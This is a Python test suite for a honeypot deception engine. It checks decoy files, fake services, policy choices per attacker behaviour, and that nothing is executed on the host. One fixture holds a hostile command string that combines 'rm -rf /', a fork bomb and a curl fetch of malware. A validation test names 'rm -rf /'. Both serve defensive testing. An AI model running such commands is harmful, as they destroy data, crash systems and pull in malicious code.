"""
tests/test_deception.py — Comprehensive tests for the Phase 3 Deception Engine.

Covers:
- Initial world state and fresh-state isolation.
- Each supported action and its expected state change.
- Action validation, preconditions, and rejection handling.
- Policy decisions for each supported behaviour category.
- Unknown behaviour and insufficient evidence safe fallbacks.
- Repeated actions and duplicate state change avoidance.
- Orchestration interface (process_session_deception and DeceptionEngine).
- Deterministic behavior across identical inputs.
- Safety boundaries: no subprocess execution, no OS system calls, no real host file access.
"""

from __future__ import annotations

import json
import os
import subprocess
import unittest
from typing import Any
from unittest.mock import patch

from analysis.engine import analyse_session
from deception.actions import (
    ACTION_NO_OP,
    ACTION_PRESENT_DECOY,
    ACTION_RECORD_INTEREST,
    ACTION_REVEAL_SERVICE,
    APPROVED_ACTIONS,
    ActionResult,
    DeceptionAction,
    apply_action,
    validate_action,
)
from deception.engine import DeceptionEngine, process_session_deception
from deception.policy_engine import PolicyDecision, evaluate_policy
from deception.world_state import (
    DecoyFile,
    FictionalService,
    FictionalUser,
    HostIdentity,
    WorldState,
)
from tests.fixtures.synthetic_sessions import (
    brute_force_session,
    brute_force_then_success,
    connect_only,
    credential_access_session,
    download_session,
    empty_session,
    file_discovery_session,
    multi_behaviour_session,
    privilege_escalation_session,
    recon_session,
    single_ls,
)


# ===========================================================================
# 1. World State Initialization & Isolation
# ===========================================================================

class TestWorldStateInitialization(unittest.TestCase):
    """Test world state creation, isolation, serialization, and events."""

    def test_default_state_initialization(self):
        state = WorldState.create_default()
        self.assertIsInstance(state.host, HostIdentity)
        self.assertEqual(state.host.hostname, "corp-srv-db01")
        self.assertEqual(state.host.primary_ip, "192.0.2.10")

        self.assertIn("root", state.users)
        self.assertIn("deploy", state.users)
        self.assertIn("www-data", state.users)

        self.assertIn("ssh", state.services)
        self.assertIn("http-web", state.services)
        self.assertIn("mysql-backend", state.services)
        self.assertEqual(state.services["mysql-backend"].state, "hidden")

        self.assertIn("/root/.ssh/id_rsa_backup", state.decoy_files)
        self.assertFalse(state.decoy_files["/root/.ssh/id_rsa_backup"].is_visible)

        self.assertEqual(len(state.discovered_files), 0)
        self.assertIn("ssh", state.discovered_services)
        self.assertEqual(len(state.attacker_interests), 0)
        self.assertEqual(len(state.action_history), 0)
        self.assertEqual(len(state.events), 0)

    def test_fresh_state_isolation(self):
        state1 = WorldState.create_default()
        state2 = WorldState.create_default()

        # Mutate state1
        state1.present_decoy("/root/.ssh/id_rsa_backup")
        state1.reveal_service("mysql-backend")
        state1.record_interest("reconnaissance")

        # Verify state2 remains unaffected
        self.assertFalse(state2.is_decoy_visible("/root/.ssh/id_rsa_backup"))
        self.assertFalse(state2.is_service_revealed("mysql-backend"))
        self.assertNotIn("reconnaissance", state2.attacker_interests)
        self.assertEqual(len(state2.events), 0)

    def test_to_dict_and_from_dict_roundtrip(self):
        state = WorldState.create_default()
        state.present_decoy("/var/www/internal/.env")
        state.record_interest("tooling_download")

        d = state.to_dict()
        # Ensure it is JSON serializable
        serialized = json.dumps(d)
        deserialized = json.loads(serialized)

        restored = WorldState.from_dict(deserialized)
        self.assertTrue(restored.is_decoy_visible("/var/www/internal/.env"))
        self.assertIn("tooling_download", restored.attacker_interests)
        self.assertEqual(restored.host.hostname, state.host.hostname)

    def test_event_logging_sequence(self):
        state = WorldState.create_default()
        e1 = state.log_event("test_event_1", {"key": "val1"})
        e2 = state.log_event("test_event_2", {"key": "val2"})

        self.assertEqual(e1["sequence_id"], 1)
        self.assertEqual(e2["sequence_id"], 2)
        self.assertEqual(len(state.events), 2)
        self.assertEqual(state.events[0]["event_type"], "test_event_1")


# ===========================================================================
# 2. Action Catalog & Transitions
# ===========================================================================

class TestActionCatalogAndTransitions(unittest.TestCase):
    """Test each approved deception action and its state transitions."""

    def setUp(self):
        self.state = WorldState.create_default()

    def test_approved_actions_catalog(self):
        expected = {
            "present_decoy_file",
            "reveal_fake_service",
            "record_attacker_interest",
            "no_op",
        }
        self.assertEqual(APPROVED_ACTIONS, expected)

    def test_present_decoy_file_success(self):
        action = DeceptionAction(
            action_id=ACTION_PRESENT_DECOY,
            target="/root/.ssh/id_rsa_backup",
            description="Presenting decoy SSH key",
        )
        result = apply_action(action, self.state)

        self.assertTrue(result.success)
        self.assertEqual(result.action_id, ACTION_PRESENT_DECOY)
        self.assertEqual(result.target, "/root/.ssh/id_rsa_backup")
        self.assertTrue(self.state.is_decoy_visible("/root/.ssh/id_rsa_backup"))
        self.assertIn("/root/.ssh/id_rsa_backup", self.state.discovered_files)
        self.assertEqual(len(self.state.action_history), 1)
        self.assertEqual(len(self.state.events), 1)

    def test_reveal_fake_service_success(self):
        action = DeceptionAction(
            action_id=ACTION_REVEAL_SERVICE,
            target="mysql-backend",
            description="Revealing internal MySQL service",
        )
        result = apply_action(action, self.state)

        self.assertTrue(result.success)
        self.assertEqual(result.action_id, ACTION_REVEAL_SERVICE)
        self.assertTrue(self.state.is_service_revealed("mysql-backend"))
        self.assertEqual(self.state.services["mysql-backend"].state, "revealed")
        self.assertIn("mysql-backend", self.state.discovered_services)
        self.assertEqual(len(self.state.action_history), 1)
        self.assertEqual(len(self.state.events), 1)

    def test_record_attacker_interest_success(self):
        action = DeceptionAction(
            action_id=ACTION_RECORD_INTEREST,
            target="reconnaissance",
            description="Logging reconnaissance interest",
        )
        result = apply_action(action, self.state)

        self.assertTrue(result.success)
        self.assertIn("reconnaissance", self.state.attacker_interests)
        self.assertEqual(len(self.state.action_history), 1)

    def test_record_attacker_interest_idempotence(self):
        action = DeceptionAction(
            action_id=ACTION_RECORD_INTEREST,
            target="reconnaissance",
        )
        apply_action(action, self.state)
        apply_action(action, self.state)

        # Topic should be present once
        self.assertEqual(self.state.attacker_interests.count("reconnaissance"), 1)

    def test_no_op_always_valid(self):
        action = DeceptionAction(
            action_id=ACTION_NO_OP,
            description="Safe fallback",
        )
        result = apply_action(action, self.state)

        self.assertTrue(result.success)
        self.assertEqual(result.action_id, ACTION_NO_OP)
        self.assertTrue(result.state_change.get("no_op"))
        # Decoys and services untouched
        self.assertFalse(self.state.is_decoy_visible("/root/.ssh/id_rsa_backup"))


# ===========================================================================
# 3. Action Validation & Preconditions
# ===========================================================================

class TestActionValidationAndRejection(unittest.TestCase):
    """Test validation failure cases, invalid targets, and preconditions."""

    def setUp(self):
        self.state = WorldState.create_default()

    def test_unapproved_action_rejected(self):
        action = DeceptionAction(action_id="execute_bash_command", target="rm -rf /")
        is_valid, msg = validate_action(action, self.state)
        self.assertFalse(is_valid)
        self.assertIn("not in the approved actions allowlist", msg)

        res = apply_action(action, self.state)
        self.assertFalse(res.success)
        self.assertIsNotNone(res.error)

    def test_present_decoy_invalid_target_rejected(self):
        action = DeceptionAction(
            action_id=ACTION_PRESENT_DECOY,
            target="/etc/nonexistent_file.conf",
        )
        is_valid, msg = validate_action(action, self.state)
        self.assertFalse(is_valid)
        self.assertIn("does not exist in fictional decoy catalog", msg)

    def test_present_decoy_already_visible_rejected(self):
        target = "/root/.ssh/id_rsa_backup"
        self.state.present_decoy(target)

        action = DeceptionAction(action_id=ACTION_PRESENT_DECOY, target=target)
        is_valid, msg = validate_action(action, self.state)
        self.assertFalse(is_valid)
        self.assertIn("already visible", msg)

    def test_reveal_service_invalid_target_rejected(self):
        action = DeceptionAction(
            action_id=ACTION_REVEAL_SERVICE,
            target="unknown-service-xyz",
        )
        is_valid, msg = validate_action(action, self.state)
        self.assertFalse(is_valid)
        self.assertIn("does not exist in fictional service catalog", msg)

    def test_reveal_service_already_active_rejected(self):
        # 'ssh' is already active by default
        action = DeceptionAction(action_id=ACTION_REVEAL_SERVICE, target="ssh")
        is_valid, msg = validate_action(action, self.state)
        self.assertFalse(is_valid)
        self.assertIn("already active or revealed", msg)

    def test_record_interest_invalid_topic_rejected(self):
        action = DeceptionAction(
            action_id=ACTION_RECORD_INTEREST,
            target="arbitrary_unapproved_interest",
        )
        is_valid, msg = validate_action(action, self.state)
        self.assertFalse(is_valid)
        self.assertIn("not in recognized topics allowlist", msg)

    def test_non_action_object_rejected(self):
        is_valid, msg = validate_action("not_an_action", self.state)  # type: ignore
        self.assertFalse(is_valid)


# ===========================================================================
# 4. Policy Decisions by Behaviour Category
# ===========================================================================

class TestPolicyDecisionsByCategory(unittest.TestCase):
    """Test policy decisions for each category using Phase 2 analysis output."""

    def setUp(self):
        self.state = WorldState.create_default()

    def test_credential_access_presents_ssh_decoy(self):
        events = credential_access_session()
        analysis = analyse_session(events, session_id="test-cred")

        decision = evaluate_policy(analysis, self.state)
        self.assertEqual(decision.policy_id, "POL-CRED-DECOY-SSH")
        self.assertEqual(decision.status, "accepted")
        self.assertEqual(decision.action.action_id, ACTION_PRESENT_DECOY)
        self.assertEqual(decision.action.target, "/root/.ssh/id_rsa_backup")

    def test_privilege_escalation_commands_records_interest(self):
        events = privilege_escalation_session()
        analysis = analyse_session(events, session_id="test-pe")

        decision = evaluate_policy(analysis, self.state)
        self.assertEqual(decision.policy_id, "POL-PRIV-ESC-RECORD")
        self.assertEqual(decision.status, "accepted")
        self.assertEqual(decision.action.action_id, ACTION_RECORD_INTEREST)
        self.assertEqual(decision.action.target, "privilege_escalation")

    def test_reconnaissance_reveals_fake_service(self):
        events = recon_session()
        analysis = analyse_session(events, session_id="test-recon")

        decision = evaluate_policy(analysis, self.state)
        self.assertEqual(decision.policy_id, "POL-RECON-REVEAL-MYSQL")
        self.assertEqual(decision.status, "accepted")
        self.assertEqual(decision.action.action_id, ACTION_REVEAL_SERVICE)
        self.assertEqual(decision.action.target, "mysql-backend")

    def test_download_attempt_presents_env_decoy(self):
        events = download_session()
        analysis = analyse_session(events, session_id="test-dl")

        decision = evaluate_policy(analysis, self.state)
        self.assertEqual(decision.policy_id, "POL-DOWNLOAD-DECOY-ENV")
        self.assertEqual(decision.status, "accepted")
        self.assertEqual(decision.action.action_id, ACTION_PRESENT_DECOY)
        self.assertEqual(decision.action.target, "/var/www/internal/.env")

    def test_file_discovery_systematic_presents_db_dump(self):
        events = file_discovery_session()
        analysis = analyse_session(events, session_id="test-fd")

        decision = evaluate_policy(analysis, self.state)
        self.assertEqual(decision.policy_id, "POL-FILE-DISC-DB-DUMP")
        self.assertEqual(decision.status, "accepted")
        self.assertEqual(decision.action.action_id, ACTION_PRESENT_DECOY)
        self.assertEqual(decision.action.target, "/home/backup/db_dump.sql")

    def test_file_discovery_weak_single_ls_records_interest(self):
        events = single_ls()
        analysis = analyse_session(events, session_id="test-single-ls")

        decision = evaluate_policy(analysis, self.state)
        # Single ls produces FD-01 (WEAK); conservative response is interest recording
        self.assertEqual(decision.policy_id, "POL-FILE-DISC-WEAK")
        self.assertEqual(decision.action.action_id, ACTION_RECORD_INTEREST)
        self.assertEqual(decision.action.target, "file_discovery")

    def test_authentication_abuse_records_interest(self):
        events = brute_force_session(num_failures=6)
        analysis = analyse_session(events, session_id="test-auth")

        decision = evaluate_policy(analysis, self.state)
        self.assertEqual(decision.policy_id, "POL-AUTH-SPRAY-MONITOR")
        self.assertEqual(decision.status, "accepted")
        self.assertEqual(decision.action.action_id, ACTION_RECORD_INTEREST)
        self.assertEqual(decision.action.target, "authentication_spray")


# ===========================================================================
# 5. Unknown Behaviour & Insufficient Evidence
# ===========================================================================

class TestPolicyUnknownAndInsufficientEvidence(unittest.TestCase):
    """Test conservative fallback behavior for benign or unknown activity."""

    def setUp(self):
        self.state = WorldState.create_default()

    def test_empty_session_safe_no_op(self):
        events = empty_session()
        analysis = analyse_session(events, session_id="empty")

        decision = evaluate_policy(analysis, self.state)
        self.assertEqual(decision.policy_id, "POL-DEFAULT-NOOP")
        self.assertEqual(decision.status, "no_action_required")
        self.assertEqual(decision.action.action_id, ACTION_NO_OP)

    def test_connect_only_safe_no_op(self):
        events = connect_only()
        analysis = analyse_session(events, session_id="connect-only")

        decision = evaluate_policy(analysis, self.state)
        self.assertEqual(decision.policy_id, "POL-DEFAULT-NOOP")
        self.assertEqual(decision.status, "no_action_required")
        self.assertEqual(decision.action.action_id, ACTION_NO_OP)

    def test_malformed_analysis_result_safe_no_op(self):
        decision = evaluate_policy({}, self.state)
        self.assertEqual(decision.action.action_id, ACTION_NO_OP)
        self.assertEqual(decision.status, "no_action_required")

        decision_none = evaluate_policy(None, self.state)  # type: ignore
        self.assertEqual(decision_none.action.action_id, ACTION_NO_OP)


# ===========================================================================
# 6. Repeated Actions & State Transition Avoidance
# ===========================================================================

class TestRepeatedActionsAndDuplicateAvoidance(unittest.TestCase):
    """Ensure policies do not repeatedly apply already complete state changes."""

    def setUp(self):
        self.state = WorldState.create_default()

    def test_credential_access_shifts_to_secondary_and_interest(self):
        analysis = analyse_session(credential_access_session())

        # Turn 1: Primary SSH decoy presented
        d1 = evaluate_policy(analysis, self.state)
        self.assertEqual(d1.policy_id, "POL-CRED-DECOY-SSH")
        apply_action(d1.action, self.state)
        self.assertTrue(self.state.is_decoy_visible("/root/.ssh/id_rsa_backup"))

        # Turn 2: Secondary .env decoy presented
        d2 = evaluate_policy(analysis, self.state)
        self.assertEqual(d2.policy_id, "POL-CRED-DECOY-ENV")
        apply_action(d2.action, self.state)
        self.assertTrue(self.state.is_decoy_visible("/var/www/internal/.env"))

        # Turn 3: Both decoys presented -> shifts to interest recording
        d3 = evaluate_policy(analysis, self.state)
        self.assertEqual(d3.policy_id, "POL-CRED-RECORD-INTEREST")
        apply_action(d3.action, self.state)
        self.assertIn("credential_harvesting", self.state.attacker_interests)

    def test_reconnaissance_shifts_services_and_interest(self):
        analysis = analyse_session(recon_session())

        # Turn 1: Reveal mysql-backend
        d1 = evaluate_policy(analysis, self.state)
        self.assertEqual(d1.policy_id, "POL-RECON-REVEAL-MYSQL")
        apply_action(d1.action, self.state)
        self.assertTrue(self.state.is_service_revealed("mysql-backend"))

        # Turn 2: Reveal redis-cache
        d2 = evaluate_policy(analysis, self.state)
        self.assertEqual(d2.policy_id, "POL-RECON-REVEAL-REDIS")
        apply_action(d2.action, self.state)
        self.assertTrue(self.state.is_service_revealed("redis-cache"))

        # Turn 3: Shift to interest
        d3 = evaluate_policy(analysis, self.state)
        self.assertEqual(d3.policy_id, "POL-RECON-RECORD-INTEREST")
        apply_action(d3.action, self.state)
        self.assertIn("reconnaissance", self.state.attacker_interests)


# ===========================================================================
# 7. Orchestration Engine
# ===========================================================================

class TestOrchestratorEngine(unittest.TestCase):
    """Test high-level process_session_deception and DeceptionEngine class."""

    def test_orchestration_full_pipeline(self):
        events = recon_session()
        analysis = analyse_session(events, session_id="recon-orch-01")

        record, updated_state = process_session_deception(analysis)

        self.assertEqual(record["session_id"], "recon-orch-01")
        self.assertEqual(record["status"], "accepted")
        self.assertEqual(record["policy_id"], "POL-RECON-REVEAL-MYSQL")
        self.assertEqual(record["action"]["action_id"], ACTION_REVEAL_SERVICE)
        self.assertEqual(record["action"]["target"], "mysql-backend")
        self.assertTrue(updated_state.is_service_revealed("mysql-backend"))
        self.assertIsNone(record["error"])

    def test_orchestration_decision_record_schema(self):
        events = download_session()
        analysis = analyse_session(events, session_id="dl-orch")
        record, _ = process_session_deception(analysis)

        required_keys = {
            "session_id",
            "status",
            "policy_id",
            "action",
            "finding",
            "explanation",
            "state_change_expected",
            "state_change_applied",
            "world_state_summary",
            "error",
        }
        self.assertTrue(required_keys.issubset(record.keys()))
        self.assertIsInstance(record["world_state_summary"], dict)

    def test_orchestration_stateful_engine_class(self):
        engine = DeceptionEngine()
        analysis_recon = analyse_session(recon_session(), session_id="s1")
        analysis_cred = analyse_session(credential_access_session(), session_id="s2")

        rec1 = engine.process(analysis_recon)
        self.assertEqual(rec1["status"], "accepted")
        self.assertTrue(engine.world_state.is_service_revealed("mysql-backend"))

        rec2 = engine.process(analysis_cred)
        self.assertEqual(rec2["status"], "accepted")
        self.assertTrue(engine.world_state.is_decoy_visible("/root/.ssh/id_rsa_backup"))

        # Both state updates persisted in same engine
        self.assertEqual(len(engine.world_state.action_history), 2)

    def test_orchestrator_handles_disallowed_action_gracefully(self):
        state = WorldState.create_default()
        # Mock policy decision with unapproved action
        fake_analysis = {"findings": [{"rule_id": "FAKE", "category": "unknown"}]}

        with patch("deception.engine.evaluate_policy") as mock_eval:
            mock_eval.return_value = PolicyDecision(
                policy_id="POL-MALICIOUS",
                action=DeceptionAction(action_id="unauthorized_exec", target="cmd"),
                status="accepted",
                finding=None,
                explanation="Malicious action attempt",
                state_change_expected={},
            )
            record, updated_state = process_session_deception(fake_analysis, state)
            self.assertEqual(record["status"], "rejected")
            self.assertIn("not in approved allowlist", record["explanation"])
            self.assertEqual(record["action"]["action_id"], ACTION_NO_OP)

    def test_record_and_state_json_serializable(self):
        events = multi_behaviour_session()
        analysis = analyse_session(events, session_id="multi-json")
        record, state = process_session_deception(analysis)

        # Must serialize cleanly without errors
        serialized_rec = json.dumps(record)
        self.assertIsInstance(serialized_rec, str)
        serialized_state = json.dumps(state.to_dict())
        self.assertIsInstance(serialized_state, str)


# ===========================================================================
# 8. Determinism
# ===========================================================================

class TestDeterminism(unittest.TestCase):
    """Ensure identical inputs yield identical decisions every time."""

    def test_identical_inputs_identical_decisions(self):
        events = recon_session()
        analysis = analyse_session(events, session_id="det-test")

        decisions = []
        for _ in range(5):
            state = WorldState.create_default()
            record, _ = process_session_deception(analysis, state)
            decisions.append(record)

        for d in decisions[1:]:
            self.assertEqual(d["policy_id"], decisions[0]["policy_id"])
            self.assertEqual(d["action"], decisions[0]["action"])
            self.assertEqual(d["status"], decisions[0]["status"])
            self.assertEqual(d["state_change_applied"], decisions[0]["state_change_applied"])


# ===========================================================================
# 9. Safety Boundaries & Isolation from Real Host
# ===========================================================================

class TestSafetyBoundariesAndNoHostExecution(unittest.TestCase):
    """Verify engine never executes system commands or touches real files."""

    def test_no_subprocess_or_system_calls_made(self):
        """Mock subprocess and os.system to fail immediately if called."""
        with patch("subprocess.Popen", side_effect=AssertionError("subprocess.Popen was called!")):
            with patch("subprocess.run", side_effect=AssertionError("subprocess.run was called!")):
                with patch("subprocess.call", side_effect=AssertionError("subprocess.call was called!")):
                    with patch("os.system", side_effect=AssertionError("os.system was called!")):
                        # Run deception engine across all synthetic session types
                        engine = DeceptionEngine()
                        sessions = [
                            empty_session(),
                            connect_only(),
                            single_ls(),
                            recon_session(),
                            brute_force_session(),
                            brute_force_then_success(),
                            download_session(),
                            privilege_escalation_session(),
                            credential_access_session(),
                            multi_behaviour_session(),
                            file_discovery_session(),
                        ]
                        for sess in sessions:
                            analysis = analyse_session(sess)
                            engine.process(analysis)

    def test_no_real_files_written_or_modified(self):
        """Ensure fictional decoy paths do not exist or get created on real disk."""
        state = WorldState.create_default()
        decoy_paths = list(state.decoy_files.keys())

        # Apply all decoys
        for p in decoy_paths:
            state.present_decoy(p)

        # None of these paths should exist on the real host filesystem
        for p in decoy_paths:
            # Check neither absolute nor local relative
            self.assertFalse(
                os.path.exists(p),
                f"Fictional decoy path {p} must NOT exist on the real filesystem!",
            )

    def test_attacker_command_payloads_never_executed(self):
        """
        Inject malicious shell commands into normalized events.
        Verify they are treated solely as passive string data and never executed.
        """
        dangerous_events = [
            {
                "timestamp": "2026-01-15T10:00:00+00:00",
                "session_id": "malicious-cmd-01",
                "event_type": "command",
                "source_ip": "192.0.2.99",
                "destination_ip": "192.0.2.10",
                "destination_port": 2222,
                "command": "rm -rf / && :(){ :|:& };: ; curl http://192.0.2.99/malware",
            }
        ]

        with patch("subprocess.run", side_effect=AssertionError("Executed!")):
            with patch("os.system", side_effect=AssertionError("Executed!")):
                analysis = analyse_session(dangerous_events, session_id="malicious-cmd-01")
                record, state = process_session_deception(analysis)

                # State remains uncompromised and safely handled
                self.assertIn(record["status"], {"accepted", "no_action_required"})
                self.assertIsInstance(record["world_state_summary"], dict)


if __name__ == "__main__":
    unittest.main()
